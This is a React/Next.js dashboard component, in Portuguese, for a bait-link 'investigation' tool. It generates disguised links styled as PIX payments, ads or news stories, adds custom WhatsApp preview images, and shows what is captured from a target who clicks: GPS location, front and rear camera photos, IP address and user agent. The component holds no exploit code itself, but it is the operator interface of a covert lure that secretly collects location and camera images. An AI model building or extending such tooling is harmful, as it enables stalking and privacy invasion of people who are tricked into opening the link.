"use client";

import { useState } from "react";
import Link from "next/link";
import {
  ArrowLeft, Copy, Check, MapPin, Camera, Smartphone,
  Globe, Newspaper, CreditCard, Power, PowerOff, ExternalLink, ShoppingBag,
  Upload, Loader2
} from "lucide-react";

type Capture = {
  id: string;
  captured_at: string;
  latitude: number | null;
  longitude: number | null;
  accuracy: number | null;
  foto_frente_url: string | null;
  foto_traseira_url: string | null;
  user_agent: string | null;
  ip: string | null;
};

type Investigation = {
  id: string;
  nome: string;
  slug: string;
  tipo: string;
  og_titulo: string | null;
  og_descricao: string | null;
  og_imagem_url: string | null;
  created_at: string;
  status: string;
};

function CopyButton({ text, label }: { text: string; label: string }) {
  const [copied, setCopied] = useState(false);
  async function copy() {
    await navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }
  return (
    <button
      onClick={copy}
      className="flex items-center gap-1.5 px-3 py-2 bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white text-sm rounded-lg transition-colors"
    >
      {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
      {copied ? "Copiado!" : label}
    </button>
  );
}

function CaptureCard({ capture }: { capture: Capture }) {
  const [fotoAberta, setFotoAberta] = useState<string | null>(null);
  const mapsUrl =
    capture.latitude && capture.longitude
      ? `https://www.google.com/maps?q=${capture.latitude},${capture.longitude}`
      : null;

  return (
    <div className="bg-gray-900 border border-gray-800 rounded-xl p-4">
      {/* Header */}
      <div className="flex items-start justify-between gap-3 mb-4">
        <div>
          <div className="text-sm font-medium text-white">
            {new Date(capture.captured_at).toLocaleString("pt-BR")}
          </div>
          <div className="flex items-center gap-2 mt-1 flex-wrap">
            {capture.ip && (
              <span className="flex items-center gap-1 text-xs text-gray-400">
                <Globe className="w-3 h-3" /> {capture.ip}
              </span>
            )}
            {capture.accuracy && (
              <span className="text-xs text-gray-500">
                precisão ±{Math.round(capture.accuracy)}m
              </span>
            )}
          </div>
        </div>
        <div className="flex gap-2">
          {capture.foto_frente_url && (
            <span className="flex items-center gap-1 text-xs bg-blue-900/40 text-blue-300 px-2 py-0.5 rounded-full">
              <Camera className="w-3 h-3" /> Frente
            </span>
          )}
          {capture.foto_traseira_url && (
            <span className="flex items-center gap-1 text-xs bg-purple-900/40 text-purple-300 px-2 py-0.5 rounded-full">
              <Camera className="w-3 h-3" /> Traseira
            </span>
          )}
        </div>
      </div>

      {/* Localização */}
      {mapsUrl ? (
        <a
          href={mapsUrl}
          target="_blank"
          rel="noopener noreferrer"
          className="flex items-center gap-2 mb-4 px-3 py-2.5 bg-emerald-900/20 border border-emerald-800/50 rounded-lg hover:bg-emerald-900/30 transition-colors group"
        >
          <MapPin className="w-4 h-4 text-emerald-400 flex-shrink-0" />
          <div className="flex-1 min-w-0">
            <div className="text-xs text-emerald-300 font-medium">Localização capturada</div>
            <div className="text-xs text-emerald-500 font-mono">
              {capture.latitude?.toFixed(6)}, {capture.longitude?.toFixed(6)}
            </div>
          </div>
          <ExternalLink className="w-3.5 h-3.5 text-emerald-500 group-hover:text-emerald-300 transition-colors" />
        </a>
      ) : (
        <div className="flex items-center gap-2 mb-4 px-3 py-2.5 bg-gray-800 rounded-lg">
          <MapPin className="w-4 h-4 text-gray-500" />
          <span className="text-xs text-gray-500">Localização não obtida</span>
        </div>
      )}

      {/* Fotos */}
      {(capture.foto_frente_url || capture.foto_traseira_url) && (
        <div className="flex gap-3 mb-4">
          {[
            { url: capture.foto_frente_url, label: "Câmera Frontal" },
            { url: capture.foto_traseira_url, label: "Câmera Traseira" },
          ].map(({ url, label }) =>
            url ? (
              <button key={label} onClick={() => setFotoAberta(url)} className="relative group">
                {/* eslint-disable-next-line @next/next/no-img-element */}
                <img
                  src={url}
                  alt={label}
                  className="w-24 h-24 object-cover rounded-lg border border-gray-700 group-hover:border-blue-500 transition-colors"
                />
                <div className="absolute inset-0 bg-black/0 group-hover:bg-black/20 rounded-lg transition-colors flex items-end justify-center pb-1">
                  <span className="text-xs text-white opacity-0 group-hover:opacity-100 bg-black/60 px-1.5 py-0.5 rounded transition-opacity">
                    {label}
                  </span>
                </div>
              </button>
            ) : null
          )}
        </div>
      )}

      {/* User agent */}
      {capture.user_agent && (
        <div className="flex items-start gap-2 text-xs text-gray-500">
          <Smartphone className="w-3.5 h-3.5 mt-0.5 flex-shrink-0" />
          <span className="break-all">{capture.user_agent}</span>
        </div>
      )}

      {/* Modal foto */}
      {fotoAberta && (
        <div
          className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-4"
          onClick={() => setFotoAberta(null)}
        >
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            src={fotoAberta}
            alt="Foto capturada"
            className="max-w-full max-h-full object-contain rounded-xl"
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}
    </div>
  );
}

export default function InvestigacaoClient({
  investigation,
  captures,
}: {
  investigation: Investigation;
  captures: Capture[];
}) {
  const [status, setStatus] = useState(investigation.status);
  const [togglingStatus, setTogglingStatus] = useState(false);
  const [ogImageUrl, setOgImageUrl] = useState(investigation.og_imagem_url);
  const [ogUploading, setOgUploading] = useState(false);
  const [ogErro, setOgErro] = useState("");
  const [ogSuccess, setOgSuccess] = useState(false);
  const baseUrl = "https://linkdigital.app.br";
  const link = `${baseUrl}/i/${investigation.slug}`;

  async function handleOgUpload(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    setOgUploading(true);
    setOgErro("");
    setOgSuccess(false);
    const reader = new FileReader();
    reader.onload = async (ev) => {
      try {
        const dataUrl = ev.target?.result as string;
        const upRes = await fetch("/api/ops/intel-link/upload-og", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: dataUrl }),
        });
        const upData = await upRes.json();
        if (!upData.url) { setOgErro(upData.error || "Falha ao enviar imagem."); return; }
        const patchRes = await fetch(`/api/ops/intel-link/${investigation.id}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ og_imagem_url: upData.url }),
        });
        if (!patchRes.ok) { setOgErro("Imagem enviada mas falha ao salvar."); return; }
        setOgImageUrl(upData.url);
        setOgSuccess(true);
      } catch {
        setOgErro("Erro de conexão.");
      } finally {
        setOgUploading(false);
      }
    };
    reader.readAsDataURL(file);
  }

  async function toggleStatus() {
    setTogglingStatus(true);
    const novoStatus = status === "ativa" ? "encerrada" : "ativa";
    try {
      const res = await fetch(`/api/ops/intel-link/${investigation.id}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: novoStatus }),
      });
      if (res.ok) setStatus(novoStatus);
    } finally {
      setTogglingStatus(false);
    }
  }

  return (
    <div className="max-w-3xl">
      {/* Header */}
      <div className="mb-6 flex items-start justify-between gap-4">
        <div className="flex items-center gap-3">
          <Link href="/ops/intel-link" className="text-gray-400 hover:text-white transition-colors">
            <ArrowLeft className="w-5 h-5" />
          </Link>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <h1 className="text-xl font-bold text-white">{investigation.nome}</h1>
              <span
                className={`text-xs px-2 py-0.5 rounded-full font-medium ${
                  investigation.tipo === "pix"
                    ? "bg-green-900/50 text-green-400"
                    : investigation.tipo === "anuncio"
                    ? "bg-amber-900/50 text-amber-400"
                    : "bg-blue-900/50 text-blue-400"
                }`}
              >
                {investigation.tipo === "pix" ? "PIX" : investigation.tipo === "anuncio" ? "Anúncio" : "Reportagem"}
              </span>
              <span
                className={`text-xs px-2 py-0.5 rounded-full font-medium ${
                  status === "ativa"
                    ? "bg-emerald-900/50 text-emerald-400"
                    : "bg-gray-700 text-gray-400"
                }`}
              >
                {status === "ativa" ? "● Ativa" : "Encerrada"}
              </span>
            </div>
            <p className="text-xs text-gray-500 mt-1">
              Criada em {new Date(investigation.created_at).toLocaleDateString("pt-BR")} · {captures.length}{" "}
              {captures.length === 1 ? "captura" : "capturas"}
            </p>
          </div>
        </div>

        <button
          onClick={toggleStatus}
          disabled={togglingStatus}
          className={`flex items-center gap-1.5 px-3 py-2 text-sm rounded-lg transition-colors disabled:opacity-50 ${
            status === "ativa"
              ? "bg-red-900/30 hover:bg-red-900/50 text-red-400 hover:text-red-300"
              : "bg-emerald-900/30 hover:bg-emerald-900/50 text-emerald-400 hover:text-emerald-300"
          }`}
        >
          {status === "ativa" ? <PowerOff className="w-4 h-4" /> : <Power className="w-4 h-4" />}
          {status === "ativa" ? "Encerrar" : "Reativar"}
        </button>
      </div>

      {/* Link da isca */}
      <div className="bg-gray-900 border border-gray-800 rounded-xl p-5 mb-6">
        <div className="flex items-center gap-2 mb-3">
          {investigation.tipo === "pix" ? (
            <CreditCard className="w-4 h-4 text-green-400" />
          ) : investigation.tipo === "anuncio" ? (
            <ShoppingBag className="w-4 h-4 text-amber-400" />
          ) : (
            <Newspaper className="w-4 h-4 text-blue-400" />
          )}
          <h2 className="text-sm font-semibold text-white">Link da Isca</h2>
        </div>

        <div className="bg-gray-800 rounded-lg px-3 py-2.5 mb-3 font-mono text-sm text-gray-300 break-all">
          {link}
        </div>

        <div className="flex gap-2 flex-wrap">
          <CopyButton text={link} label="Copiar link" />
          <a
            href={`https://wa.me/?text=${encodeURIComponent(link)}`}
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center gap-1.5 px-3 py-2 bg-green-900/30 hover:bg-green-900/50 text-green-400 text-sm rounded-lg transition-colors"
          >
            <ExternalLink className="w-4 h-4" />
            Compartilhar no WhatsApp
          </a>
          {status !== "ativa" && (
            <span className="flex items-center text-xs text-amber-400 px-3 py-2 bg-amber-900/20 rounded-lg">
              ⚠ Investigação encerrada — capturas não serão salvas
            </span>
          )}
        </div>

        {investigation.og_titulo && (
          <div className="mt-4 pt-4 border-t border-gray-800">
            <p className="text-xs text-gray-500 mb-2">Preview configurado:</p>
            <div className="text-sm text-white font-medium">{investigation.og_titulo}</div>
            {investigation.og_descricao && (
              <div className="text-xs text-gray-400 mt-0.5 line-clamp-2">{investigation.og_descricao}</div>
            )}
          </div>
        )}

        {/* Imagem WhatsApp (OG) */}
        <div className="mt-4 pt-4 border-t border-gray-800">
          <div className="flex items-center justify-between mb-2">
            <p className="text-xs text-gray-400 font-medium">Imagem WhatsApp (OG)</p>
            <label className={`cursor-pointer flex items-center gap-1.5 px-2.5 py-1.5 bg-gray-800 hover:bg-gray-700 text-gray-300 text-xs rounded-lg transition-colors ${ogUploading ? "opacity-50 cursor-not-allowed" : ""}`}>
              {ogUploading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Upload className="w-3.5 h-3.5" />}
              {ogUploading ? "Enviando..." : ogImageUrl ? "Substituir" : "Adicionar"}
              <input type="file" accept="image/*" className="hidden" onChange={handleOgUpload} disabled={ogUploading} />
            </label>
          </div>
          {ogImageUrl ? (
            // eslint-disable-next-line @next/next/no-img-element
            <img src={ogImageUrl} alt="imagem og" className="w-full max-h-36 object-cover rounded-lg border border-gray-700" />
          ) : (
            <div className="flex items-start gap-2 px-3 py-2.5 bg-amber-900/20 border border-amber-800/50 rounded-lg">
              <span className="text-amber-400 text-sm mt-0.5">⚠</span>
              <span className="text-xs text-amber-300">Sem imagem — o WhatsApp não mostrará card de preview ao compartilhar este link.</span>
            </div>
          )}
          {ogErro && <p className="text-xs text-red-400 mt-1.5">{ogErro}</p>}
          {ogSuccess && <p className="text-xs text-green-400 mt-1.5">Imagem atualizada com sucesso!</p>}
        </div>
      </div>

      {/* Capturas */}
      <div>
        <h2 className="text-sm font-semibold text-gray-300 mb-3 flex items-center gap-2">
          <Camera className="w-4 h-4" />
          Capturas ({captures.length})
        </h2>

        {captures.length === 0 ? (
          <div className="text-center py-12 text-gray-500 bg-gray-900/50 rounded-xl border border-gray-800 border-dashed">
            Nenhuma captura ainda. Aguardando o alvo clicar no link.
          </div>
        ) : (
          <div className="space-y-3">
            {captures.map((c) => (
              <CaptureCard key={c.id} capture={c} />
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
